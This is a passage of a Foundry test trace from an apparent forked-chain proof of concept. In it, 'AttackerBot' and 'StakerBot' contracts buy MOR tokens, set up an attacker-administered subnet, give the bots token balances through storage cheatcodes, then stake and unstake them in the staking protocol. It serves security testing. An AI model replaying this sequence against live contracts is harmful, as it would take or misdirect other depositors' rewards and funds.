    ├─ [7257] 0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9::minimalWithdrawLockPeriod() [staticcall]
    │   ├─ [2362] 0x18FAEf315b40A6D9cf49628f1133B1Aa507513B0::minimalWithdrawLockPeriod() [delegatecall]
    │   │   └─ ← [Return] 604800 [6.048e5]
    │   └─ ← [Return] 604800 [6.048e5]
    ├─ [325212] AttackerBot::selfFundWithEth(20000000000000000000 [2e19])
    │   ├─ [23802] 0x4200000000000000000000000000000000000006::deposit{value: 20000000000000000000}()
    │   │   ├─ emit Deposit(param0: AttackerBot: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], param1: 20000000000000000000 [2e19])
    │   │   └─ ← [Stop]
    │   ├─ [24399] 0x4200000000000000000000000000000000000006::approve(0x2626664c2603336E57B271c5C0b26F421741e481, 20000000000000000000 [2e19])
    │   │   ├─ emit Approval(owner: AttackerBot: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: 0x2626664c2603336E57B271c5C0b26F421741e481, amount: 20000000000000000000 [2e19])
    │   │   └─ ← [Return] true
    │   ├─ [242291] 0x2626664c2603336E57B271c5C0b26F421741e481::exactInputSingle(ExactInputSingleParams({ tokenIn: 0x4200000000000000000000000000000000000006, tokenOut: 0x7431aDa8a591C955a994a21710752EF9b882b8e3, fee: 3000, recipient: 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f, amountIn: 20000000000000000000 [2e19], amountOutMinimum: 0, sqrtPriceLimitX96: 0 }))
    │   │   ├─ [234895] 0x37ecD41f5a01B23a3d9bb3b4DdfEF4eD455d6fd3::swap(AttackerBot: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], true, 20000000000000000000 [2e19], 4295128740 [4.295e9], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f000000000000000000000000000000000000000000000000000000000000002b4200000000000000000000000000000000000006000bb87431ada8a591c955a994a21710752ef9b882b8e3000000000000000000000000000000000000000000)
    │   │   │   ├─ [29849] 0x7431aDa8a591C955a994a21710752EF9b882b8e3::transfer(AttackerBot: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 15673878065841178936940 [1.567e22])
    │   │   │   │   ├─ emit Transfer(from: 0x37ecD41f5a01B23a3d9bb3b4DdfEF4eD455d6fd3, to: AttackerBot: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], amount: 15673878065841178936940 [1.567e22])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [2457] 0x4200000000000000000000000000000000000006::balanceOf(0x37ecD41f5a01B23a3d9bb3b4DdfEF4eD455d6fd3) [staticcall]
    │   │   │   │   └─ ← [Return] 9904977641525771653 [9.904e18]
    │   │   │   ├─ [10793] 0x2626664c2603336E57B271c5C0b26F421741e481::uniswapV3SwapCallback(20000000000000000000 [2e19], -15673878065841178936940 [-1.567e22], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f000000000000000000000000000000000000000000000000000000000000002b4200000000000000000000000000000000000006000bb87431ada8a591c955a994a21710752ef9b882b8e3000000000000000000000000000000000000000000)
    │   │   │   │   ├─ [6700] 0x4200000000000000000000000000000000000006::transferFrom(AttackerBot: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x37ecD41f5a01B23a3d9bb3b4DdfEF4eD455d6fd3, 20000000000000000000 [2e19])
    │   │   │   │   │   ├─ emit Transfer(from: AttackerBot: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0x37ecD41f5a01B23a3d9bb3b4DdfEF4eD455d6fd3, amount: 20000000000000000000 [2e19])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   └─ ← [Stop]
    │   │   │   ├─ [457] 0x4200000000000000000000000000000000000006::balanceOf(0x37ecD41f5a01B23a3d9bb3b4DdfEF4eD455d6fd3) [staticcall]
    │   │   │   │   └─ ← [Return] 29904977641525771653 [2.99e19]
    │   │   │   ├─ emit Swap(param0: 0x2626664c2603336E57B271c5C0b26F421741e481, param1: AttackerBot: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], param2: 20000000000000000000 [2e19], param3: -15673878065841178936940 [-1.567e22], param4: 1244894856896898156921887508795 [1.244e30], param5: 464403078735912633302 [4.644e20], param6: 55092 [5.509e4])
    │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000001158e460913d00000fffffffffffffffffffffffffffffffffffffffffffffcae513efee1eddbf994
    │   │   └─ ← [Return] 15673878065841178936940 [1.567e22]
    │   └─ ← [Return] 15673878065841178936940 [1.567e22]
    ├─ [0] console::log("Attacker MOR bought with 20 ETH (self-funded):", 15673 [1.567e4]) [staticcall]
    │   └─ ← [Stop]
    ├─ [157561] AttackerBot::createHonestSubnet("ai-grants-pool", 604800 [6.048e5])
    │   ├─ [130320] 0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9::createSubnet(Subnet({ name: "ai-grants-pool", admin: 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f, unusedStorage1_V4Update: 0, withdrawLockPeriodAfterDeposit: 604800 [6.048e5], unusedStorage2_V4Update: 0, minimalDeposit: 0, claimAdmin: 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f }), SubnetMetadata({ slug: "", description: "", website: "", image: "" }))
    │   │   ├─ [125320] 0x18FAEf315b40A6D9cf49628f1133B1Aa507513B0::createSubnet(Subnet({ name: "ai-grants-pool", admin: 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f, unusedStorage1_V4Update: 0, withdrawLockPeriodAfterDeposit: 604800 [6.048e5], unusedStorage2_V4Update: 0, minimalDeposit: 0, claimAdmin: 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f }), SubnetMetadata({ slug: "", description: "", website: "", image: "" })) [delegatecall]
    │   │   │   ├─  emit topic 0: 0x324be7615e7426fd202129f38dc6e54fba11d31a44c1840c079569443bf5761e
    │   │   │   │        topic 1: 0xfba542a9d774d1220002dcd4e41dffda8ea4347fc0fdf267fba5f2af9d262bd8
    │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000c000000000000000000000000000000000000000000000000000000000000000e00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    │   │   │   ├─  emit topic 0: 0x81e40ef5fe671f06602768a6c0c1027dd2a1a6fd34bfb1260443741b283cb86e
    │   │   │   │        topic 1: 0xfba542a9d774d1220002dcd4e41dffda8ea4347fc0fdf267fba5f2af9d262bd8
    │   │   │   │           data: 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000e00000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000093a80000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f000000000000000000000000000000000000000000000000000000000000000e61692d6772616e74732d706f6f6c000000000000000000000000000000000000
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Return]
    │   └─ ← [Stop]
    ├─ [5999] 0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9::getSubnetId("ai-grants-pool") [staticcall]
    │   ├─ [1092] 0x18FAEf315b40A6D9cf49628f1133B1Aa507513B0::getSubnetId("ai-grants-pool") [delegatecall]
    │   │   └─ ← [Return] 0xfba542a9d774d1220002dcd4e41dffda8ea4347fc0fdf267fba5f2af9d262bd8
    │   └─ ← [Return] 0xfba542a9d774d1220002dcd4e41dffda8ea4347fc0fdf267fba5f2af9d262bd8
    ├─ [228382] AttackerBot::seedOwnSubnet(0xfba542a9d774d1220002dcd4e41dffda8ea4347fc0fdf267fba5f2af9d262bd8, 15673878065841178936940 [1.567e22])
    │   ├─ [24676] 0x7431aDa8a591C955a994a21710752EF9b882b8e3::approve(0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9, 15673878065841178936940 [1.567e22])
    │   │   ├─ emit Approval(owner: AttackerBot: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: 0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9, amount: 15673878065841178936940 [1.567e22])
    │   │   └─ ← [Return] true
    │   ├─ [175804] 0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9::deposit(0xfba542a9d774d1220002dcd4e41dffda8ea4347fc0fdf267fba5f2af9d262bd8, 15673878065841178936940 [1.567e22])
    │   │   ├─ [170906] 0x18FAEf315b40A6D9cf49628f1133B1Aa507513B0::deposit(0xfba542a9d774d1220002dcd4e41dffda8ea4347fc0fdf267fba5f2af9d262bd8, 15673878065841178936940 [1.567e22]) [delegatecall]
    │   │   │   ├─ [15506] 0x7431aDa8a591C955a994a21710752EF9b882b8e3::transferFrom(AttackerBot: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9, 15673878065841178936940 [1.567e22])
    │   │   │   │   ├─ emit Approval(owner: AttackerBot: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: 0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9, amount: 0)
    │   │   │   │   ├─ emit Transfer(from: AttackerBot: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9, amount: 15673878065841178936940 [1.567e22])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [19621] 0xDC99a8596e395E52aba2BD08C623E1e428Dc3980::getPeriodRewards(3, 1794923930 [1.794e9], 1794926375 [1.794e9]) [staticcall]
    │   │   │   │   ├─ [14714] 0x4De9D52A6a951C2Dc7b22805EEec2bC41404909d::getPeriodRewards(3, 1794923930 [1.794e9], 1794926375 [1.794e9]) [delegatecall]
    │   │   │   │   │   ├─ [2511] 0x2265ae4127a49218c1C562Cb16822971f295Ed50::getPeriodReward(3456000000000000000000 [3.456e21], 592558728240000000 [5.925e17], 1707393600 [1.707e9], 86400 [8.64e4], 1794923930 [1.794e9], 1794926375 [1.794e9]) [delegatecall]
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000046182f0b6ea89b28d
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000046182f0b6ea89b28d
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000046182f0b6ea89b28d
    │   │   │   ├─  emit topic 0: 0x6c7131e79092f16af04daf787c07a4dc80e7ae1a95dbe1cc1a310cfe1619d2db
    │   │   │   │        topic 1: 0xfba542a9d774d1220002dcd4e41dffda8ea4347fc0fdf267fba5f2af9d262bd8
    │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │           data: 0x000000000000000000000000000000000000000000000351aec1011e1224066c
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Return]
    │   └─ ← [Stop]
    ├─ [171595] → new StakerBot@0xc7183455a4C133Ae270771860664b6B7ec320bB1
    │   └─ ← [Return] 548 bytes of code
    ├─ [2664] 0x7431aDa8a591C955a994a21710752EF9b882b8e3::balanceOf(StakerBot: [0xc7183455a4C133Ae270771860664b6B7ec320bB1]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::record()
    │   └─ ← [Return]
    ├─ [2664] 0x7431aDa8a591C955a994a21710752EF9b882b8e3::balanceOf(StakerBot: [0xc7183455a4C133Ae270771860664b6B7ec320bB1]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::accesses(0x7431aDa8a591C955a994a21710752EF9b882b8e3) [staticcall]
    │   └─ ← [Return] [0xf0880fa9cf34dc0a77f101a09955a834f6bfc0be68993a860258262161f13db0], []
    ├─ [0] VM::stopRecord()
    │   └─ ← [Return]
    ├─ [0] VM::load(0x7431aDa8a591C955a994a21710752EF9b882b8e3, 0xf0880fa9cf34dc0a77f101a09955a834f6bfc0be68993a860258262161f13db0) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ emit WARNING_UninitedSlot(who: 0x7431aDa8a591C955a994a21710752EF9b882b8e3, slot: 108795482965041371612054286715306919363267310585030287118912565258676599864752 [1.087e77])
    ├─ [0] VM::load(0x7431aDa8a591C955a994a21710752EF9b882b8e3, 0xf0880fa9cf34dc0a77f101a09955a834f6bfc0be68993a860258262161f13db0) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ [2664] 0x7431aDa8a591C955a994a21710752EF9b882b8e3::balanceOf(StakerBot: [0xc7183455a4C133Ae270771860664b6B7ec320bB1]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::store(0x7431aDa8a591C955a994a21710752EF9b882b8e3, 0xf0880fa9cf34dc0a77f101a09955a834f6bfc0be68993a860258262161f13db0, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)
    │   └─ ← [Return]
    ├─ [2664] 0x7431aDa8a591C955a994a21710752EF9b882b8e3::balanceOf(StakerBot: [0xc7183455a4C133Ae270771860664b6B7ec320bB1]) [staticcall]
    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    ├─ [0] VM::store(0x7431aDa8a591C955a994a21710752EF9b882b8e3, 0xf0880fa9cf34dc0a77f101a09955a834f6bfc0be68993a860258262161f13db0, 0x0000000000000000000000000000000000000000000000000000000000000000)
    │   └─ ← [Return]
    ├─ emit SlotFound(who: 0x7431aDa8a591C955a994a21710752EF9b882b8e3, fsig: 0x70a08231, keysHash: 0x8e945654193bec28956c368b451931aae1dd2f910b3127995a9fc7169f7ea4d1, slot: 108795482965041371612054286715306919363267310585030287118912565258676599864752 [1.087e77])
    ├─ [0] VM::load(0x7431aDa8a591C955a994a21710752EF9b882b8e3, 0xf0880fa9cf34dc0a77f101a09955a834f6bfc0be68993a860258262161f13db0) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ [0] VM::store(0x7431aDa8a591C955a994a21710752EF9b882b8e3, 0xf0880fa9cf34dc0a77f101a09955a834f6bfc0be68993a860258262161f13db0, 0x00000000000000000000000000000000000000000000043c33c1937564800000)
    │   └─ ← [Return]
    ├─ [2664] 0x7431aDa8a591C955a994a21710752EF9b882b8e3::balanceOf(StakerBot: [0xc7183455a4C133Ae270771860664b6B7ec320bB1]) [staticcall]
    │   └─ ← [Return] 20000000000000000000000 [2e22]
    ├─ [181891] StakerBot::stake(0xfba542a9d774d1220002dcd4e41dffda8ea4347fc0fdf267fba5f2af9d262bd8, 20000000000000000000000 [2e22])
    │   ├─ [24676] 0x7431aDa8a591C955a994a21710752EF9b882b8e3::approve(0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9, 20000000000000000000000 [2e22])
    │   │   ├─ emit Approval(owner: StakerBot: [0xc7183455a4C133Ae270771860664b6B7ec320bB1], spender: 0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9, amount: 20000000000000000000000 [2e22])
    │   │   └─ ← [Return] true
    │   ├─ [129391] 0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9::deposit(0xfba542a9d774d1220002dcd4e41dffda8ea4347fc0fdf267fba5f2af9d262bd8, 20000000000000000000000 [2e22])
    │   │   ├─ [124493] 0x18FAEf315b40A6D9cf49628f1133B1Aa507513B0::deposit(0xfba542a9d774d1220002dcd4e41dffda8ea4347fc0fdf267fba5f2af9d262bd8, 20000000000000000000000 [2e22]) [delegatecall]
    │   │   │   ├─ [15506] 0x7431aDa8a591C955a994a21710752EF9b882b8e3::transferFrom(StakerBot: [0xc7183455a4C133Ae270771860664b6B7ec320bB1], 0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9, 20000000000000000000000 [2e22])
    │   │   │   │   ├─ emit Approval(owner: StakerBot: [0xc7183455a4C133Ae270771860664b6B7ec320bB1], spender: 0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9, amount: 0)
    │   │   │   │   ├─ emit Transfer(from: StakerBot: [0xc7183455a4C133Ae270771860664b6B7ec320bB1], to: 0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9, amount: 20000000000000000000000 [2e22])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [18595] 0xDC99a8596e395E52aba2BD08C623E1e428Dc3980::getPeriodRewards(3, 1794926375 [1.794e9], 1794926375 [1.794e9]) [staticcall]
    │   │   │   │   ├─ [13688] 0x4De9D52A6a951C2Dc7b22805EEec2bC41404909d::getPeriodRewards(3, 1794926375 [1.794e9], 1794926375 [1.794e9]) [delegatecall]
    │   │   │   │   │   ├─ [1485] 0x2265ae4127a49218c1C562Cb16822971f295Ed50::getPeriodReward(3456000000000000000000 [3.456e21], 592558728240000000 [5.925e17], 1707393600 [1.707e9], 86400 [8.64e4], 1794926375 [1.794e9], 1794926375 [1.794e9]) [delegatecall]
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   ├─  emit topic 0: 0x6c7131e79092f16af04daf787c07a4dc80e7ae1a95dbe1cc1a310cfe1619d2db
    │   │   │   │        topic 1: 0xfba542a9d774d1220002dcd4e41dffda8ea4347fc0fdf267fba5f2af9d262bd8
    │   │   │   │        topic 2: 0x000000000000000000000000c7183455a4c133ae270771860664b6b7ec320bb1
    │   │   │   │           data: 0x00000000000000000000000000000000000000000000043c33c1937564800000
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Return]
    │   └─ ← [Stop]
    ├─ [0] VM::warp(1795531176 [1.795e9])
    │   └─ ← [Return]
    ├─ [171893] StakerBot::unstake(0xfba542a9d774d1220002dcd4e41dffda8ea4347fc0fdf267fba5f2af9d262bd8, 20000000000000000000000 [2e22])
    │   ├─ [147003] 0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9::withdraw(0xfba542a9d774d1220002dcd4e41dffda8ea4347fc0fdf267fba5f2af9d262bd8, 20000000000000000000000 [2e22])
    │   │   ├─ [142105] 0x18FAEf315b40A6D9cf49628f1133B1Aa507513B0::withdraw(0xfba542a9d774d1220002dcd4e41dffda8ea4347fc0fdf267fba5f2af9d262bd8, 20000000000000000000000 [2e22]) [delegatecall]
    │   │   │   ├─ [23031] 0xDC99a8596e395E52aba2BD08C623E1e428Dc3980::getPeriodRewards(3, 1794926375 [1.794e9], 1795531176 [1.795e9]) [staticcall]
    │   │   │   │   ├─ [18124] 0x4De9D52A6a951C2Dc7b22805EEec2bC41404909d::getPeriodRewards(3, 1794926375 [1.794e9], 1795531176 [1.795e9]) [delegatecall]
    │   │   │   │   │   ├─ [5921] 0x2265ae4127a49218c1C562Cb16822971f295Ed50::getPeriodReward(3456000000000000000000 [3.456e21], 592558728240000000 [5.925e17], 1707393600 [1.707e9], 86400 [8.64e4], 1794926375 [1.794e9], 1795531176 [1.795e9]) [delegatecall]
    │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000043af8ab85d9e3fd643b
    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000043af8ab85d9e3fd643b
    │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000043af8ab85d9e3fd643b
    │   │   │   ├─ [29849] 0x7431aDa8a591C955a994a21710752EF9b882b8e3::transfer(StakerBot: [0xc7183455a4C133Ae270771860664b6B7ec320bB1], 20000000000000000000000 [2e22])
    │   │   │   │   ├─ emit Transfer(from: 0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9, to: StakerBot: [0xc7183455a4C133Ae270771860664b6B7ec320bB1], amount: 20000000000000000000000 [2e22])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─  emit topic 0: 0x91ce5144c91c77840ff78678c0787f033a9f2209ab6a26552adb61a542da4a0d
    │   │   │   │        topic 1: 0xfba542a9d774d1220002dcd4e41dffda8ea4347fc0fdf267fba5f2af9d262bd8
    │   │   │   │        topic 2: 0x000000000000000000000000c7183455a4c133ae270771860664b6b7ec320bb1
    │   │   │   │           data: 0x00000000000000000000000000000000000000000000043c33c1937564800000
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Return]
    │   └─ ← [Stop]
    ├─ [2664] 0x7431aDa8a591C955a994a21710752EF9b882b8e3::balanceOf(StakerBot: [0xc7183455a4C133Ae270771860664b6B7ec320bB1]) [staticcall]
    │   └─ ← [Return] 20000000000000000000000 [2e22]
    ├─ [171595] → new StakerBot@0xA4AD4f68d0b91CFD19687c881e50f3A00242828c
    │   └─ ← [Return] 548 bytes of code
    ├─ [2664] 0x7431aDa8a591C955a994a21710752EF9b882b8e3::balanceOf(StakerBot: [0xA4AD4f68d0b91CFD19687c881e50f3A00242828c]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::record()
    │   └─ ← [Return]
    ├─ [2664] 0x7431aDa8a591C955a994a21710752EF9b882b8e3::balanceOf(StakerBot: [0xA4AD4f68d0b91CFD19687c881e50f3A00242828c]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::accesses(0x7431aDa8a591C955a994a21710752EF9b882b8e3) [staticcall]
    │   └─ ← [Return] [0xf86ba4852f4856fe738ed1f1f34b9591e9e1791fb499e98b43dad0922f03ce45], []
    ├─ [0] VM::stopRecord()
    │   └─ ← [Return]
    ├─ [0] VM::load(0x7431aDa8a591C955a994a21710752EF9b882b8e3, 0xf86ba4852f4856fe738ed1f1f34b9591e9e1791fb499e98b43dad0922f03ce45) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ emit WARNING_UninitedSlot(who: 0x7431aDa8a591C955a994a21710752EF9b882b8e3, slot: 112363774561634568407689124338274759344240055860521020215413326154685823045189 [1.123e77])
    ├─ [0] VM::load(0x7431aDa8a591C955a994a21710752EF9b882b8e3, 0xf86ba4852f4856fe738ed1f1f34b9591e9e1791fb499e98b43dad0922f03ce45) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ [2664] 0x7431aDa8a591C955a994a21710752EF9b882b8e3::balanceOf(StakerBot: [0xA4AD4f68d0b91CFD19687c881e50f3A00242828c]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::store(0x7431aDa8a591C955a994a21710752EF9b882b8e3, 0xf86ba4852f4856fe738ed1f1f34b9591e9e1791fb499e98b43dad0922f03ce45, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)
    │   └─ ← [Return]
    ├─ [2664] 0x7431aDa8a591C955a994a21710752EF9b882b8e3::balanceOf(StakerBot: [0xA4AD4f68d0b91CFD19687c881e50f3A00242828c]) [staticcall]
    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    ├─ [0] VM::store(0x7431aDa8a591C955a994a21710752EF9b882b8e3, 0xf86ba4852f4856fe738ed1f1f34b9591e9e1791fb499e98b43dad0922f03ce45, 0x0000000000000000000000000000000000000000000000000000000000000000)
    │   └─ ← [Return]
    ├─ emit SlotFound(who: 0x7431aDa8a591C955a994a21710752EF9b882b8e3, fsig: 0x70a08231, keysHash: 0x3ed6ac8c91c6a3393714d60911843915908fd4a3933f705ec0d1e6d5fa7e0df4, slot: 112363774561634568407689124338274759344240055860521020215413326154685823045189 [1.123e77])
    ├─ [0] VM::load(0x7431aDa8a591C955a994a21710752EF9b882b8e3, 0xf86ba4852f4856fe738ed1f1f34b9591e9e1791fb499e98b43dad0922f03ce45) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ [0] VM::store(0x7431aDa8a591C955a994a21710752EF9b882b8e3, 0xf86ba4852f4856fe738ed1f1f34b9591e9e1791fb499e98b43dad0922f03ce45, 0x00000000000000000000000000000000000000000000152d02c7e14af6800000)
    │   └─ ← [Return]
    ├─ [2664] 0x7431aDa8a591C955a994a21710752EF9b882b8e3::balanceOf(StakerBot: [0xA4AD4f68d0b91CFD19687c881e50f3A00242828c]) [staticcall]
    │   └─ ← [Return] 100000000000000000000000 [1e23]
    ├─ [171595] → new StakerBot@0x03A6a84cD762D9707A21605b548aaaB891562aAb
    │   └─ ← [Return] 548 bytes of code
    ├─ [2664] 0x7431aDa8a591C955a994a21710752EF9b882b8e3::balanceOf(StakerBot: [0x03A6a84cD762D9707A21605b548aaaB891562aAb]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::record()
    │   └─ ← [Return]
    ├─ [2664] 0x7431aDa8a591C955a994a21710752EF9b882b8e3::balanceOf(StakerBot: [0x03A6a84cD762D9707A21605b548aaaB891562aAb]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::accesses(0x7431aDa8a591C955a994a21710752EF9b882b8e3) [staticcall]
    │   └─ ← [Return] [0x4161d2049a722cbaa88954f76d0ac52384bcd49e2599ac558112071c00d1bf8e], []
    ├─ [0] VM::stopRecord()
    │   └─ ← [Return]
    ├─ [0] VM::load(0x7431aDa8a591C955a994a21710752EF9b882b8e3, 0x4161d2049a722cbaa88954f76d0ac52384bcd49e2599ac558112071c00d1bf8e) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ emit WARNING_UninitedSlot(who: 0x7431aDa8a591C955a994a21710752EF9b882b8e3, slot: 29573168814033492885022403845169711711369899980498886494121503781989020450702 [2.957e76])
    ├─ [0] VM::load(0x7431aDa8a591C955a994a21710752EF9b882b8e3, 0x4161d2049a722cbaa88954f76d0ac52384bcd49e2599ac558112071c00d1bf8e) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ [2664] 0x7431aDa8a591C955a994a21710752EF9b882b8e3::balanceOf(StakerBot: [0x03A6a84cD762D9707A21605b548aaaB891562aAb]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::store(0x7431aDa8a591C955a994a21710752EF9b882b8e3, 0x4161d2049a722cbaa88954f76d0ac52384bcd49e2599ac558112071c00d1bf8e, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)
    │   └─ ← [Return]
    ├─ [2664] 0x7431aDa8a591C955a994a21710752EF9b882b8e3::balanceOf(StakerBot: [0x03A6a84cD762D9707A21605b548aaaB891562aAb]) [staticcall]
    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    ├─ [0] VM::store(0x7431aDa8a591C955a994a21710752EF9b882b8e3, 0x4161d2049a722cbaa88954f76d0ac52384bcd49e2599ac558112071c00d1bf8e, 0x0000000000000000000000000000000000000000000000000000000000000000)
    │   └─ ← [Return]
    ├─ emit SlotFound(who: 0x7431aDa8a591C955a994a21710752EF9b882b8e3, fsig: 0x70a08231, keysHash: 0x015e5750232c79b34d1dc71434962b8e457565229b62e2054f1d479ae19540e4, slot: 29573168814033492885022403845169711711369899980498886494121503781989020450702 [2.957e76])
    ├─ [0] VM::load(0x7431aDa8a591C955a994a21710752EF9b882b8e3, 0x4161d2049a722cbaa88954f76d0ac52384bcd49e2599ac558112071c00d1bf8e) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ [0] VM::store(0x7431aDa8a591C955a994a21710752EF9b882b8e3, 0x4161d2049a722cbaa88954f76d0ac52384bcd49e2599ac558112071c00d1bf8e, 0x00000000000000000000000000000000000000000000152d02c7e14af6800000)
    │   └─ ← [Return]
    ├─ [2664] 0x7431aDa8a591C955a994a21710752EF9b882b8e3::balanceOf(StakerBot: [0x03A6a84cD762D9707A21605b548aaaB891562aAb]) [staticcall]
    │   └─ ← [Return] 100000000000000000000000 [1e23]
    ├─ [171595] → new StakerBot@0xD6BbDE9174b1CdAa358d2Cf4D57D1a9F7178FBfF
    │   └─ ← [Return] 548 bytes of code
    ├─ [2664] 0x7431aDa8a591C955a994a21710752EF9b882b8e3::balanceOf(StakerBot: [0xD6BbDE9174b1CdAa358d2Cf4D57D1a9F7178FBfF]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::record()
    │   └─ ← [Return]
    ├─ [2664] 0x7431aDa8a591C955a994a21710752EF9b882b8e3::balanceOf(StakerBot: [0xD6BbDE9174b1CdAa358d2Cf4D57D1a9F7178FBfF]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::accesses(0x7431aDa8a591C955a994a21710752EF9b882b8e3) [staticcall]
    │   └─ ← [Return] [0x955eb53aa5a836a76e936fd6ede41c7b84c77cbaeca5406e7e22cb49ab0ee0c4], []
    ├─ [0] VM::stopRecord()
    │   └─ ← [Return]
    ├─ [0] VM::load(0x7431aDa8a591C955a994a21710752EF9b882b8e3, 0x955eb53aa5a836a76e936fd6ede41c7b84c77cbaeca5406e7e22cb49ab0ee0c4) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
